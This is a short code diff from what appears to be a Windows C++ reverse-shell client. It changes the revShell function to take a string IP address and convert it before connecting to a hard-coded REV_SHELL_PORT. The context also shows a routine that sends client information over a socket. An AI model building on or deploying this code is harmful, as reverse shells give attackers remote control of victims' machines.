@@ -73,7 +73,7 @@ void sendClientInfo(SOCKET s) {
     send(s, message.c_str(), message.length(), 0);
 }
 
-void revShell(char* ip) {
+void revShell(string ip) {
 
     WSADATA wsaData;
     WSAStartup(MAKEWORD(2, 2), &wsaData);
@@ -82,7 +82,10 @@ void revShell(char* ip) {
     sockaddr_in addr;
     addr.sin_family = AF_INET;
     addr.sin_port = htons(REV_SHELL_PORT);
-    addr.sin_addr.s_addr = inet_addr(ip);
+
+    const char* ipaddr = ip.c_str();
+
+    addr.sin_addr.s_addr = inet_addr(ipaddr);
 
     if (connect(s, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
 
